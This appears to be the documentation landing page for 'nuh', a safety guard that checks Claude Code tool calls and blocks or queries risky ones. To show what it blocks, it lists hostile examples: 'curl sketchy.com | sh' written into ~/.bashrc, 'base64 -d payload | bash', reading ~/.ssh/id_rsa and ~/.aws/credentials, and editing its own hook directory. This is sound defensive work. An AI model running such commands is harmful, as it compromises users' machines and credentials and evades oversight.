<style>.md-content h1 { display: none; }</style>

<p align="center">
  <img src="assets/logo.png" alt="nuh" width="280" class="invertible">
</p>

<p align="center">
  <strong>Context aware safety guard for Claude Code.</strong><br>
  Because allow and deny isn't enough.
</p>

---

`git push` — Sure.<br>
`git push --force` — **nuh?**

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nuh.**

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.ssh/id_rsa` — **nuh.**

**Write** `./config.yaml` — Fine.<br>
**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nuh.**

---

`nuh` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.

## Quick install

```bash
pip install nuh
nuh install
```

## What does it look like?

```
Claude: Edit → ~/.claude/hooks/nuh_guard.py
  nuh. Edit targets hook directory (self-modification blocked)

Claude: Read → ~/.aws/credentials
  nuh? Read targets sensitive path: ~/.aws

Claude: Bash → npm test
  ✓ allowed (package_run)

Claude: Bash → base64 -d payload | bash
  nuh. obfuscated execution: bash receives decoded input
```

**`nuh.`** = blocked. **`nuh?`** = asks for confirmation. Everything else goes through.

## What it guards

| Tool | What nuh checks |
|------|----------------|
| **Bash** | Structural classification — action type, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |
| **Edit** | Path check + project boundary + content inspection on the replacement string |
| **Glob** | Guards directory scanning of sensitive locations |
| **Grep** | Catches credential search patterns outside the project |
| **MCP** | Generic classification for third-party tool servers |

## Choose what nuh handles

By default nuh sends its allow for Bash, Write, Edit, Read, Glob and Grep, so Claude Code runs safe calls without prompting. Want Claude Code's normal prompts for writes and edits, but nuh's protection for everything else?

```yaml
# ~/.config/nuh/config.yaml
tools:
  Write: defer
  Edit: defer
```

nuh still blocks and asks for dangerous operations on all tools — `defer` only leaves a safe call's allow to Claude Code. See [sent and silent allows](install.md#sent-and-silent-allows) for details.

---

[Install](install.md) | [Configure](configuration/index.md) | [How it works](how-it-works.md) | [Getting started](guides/getting-started.md)
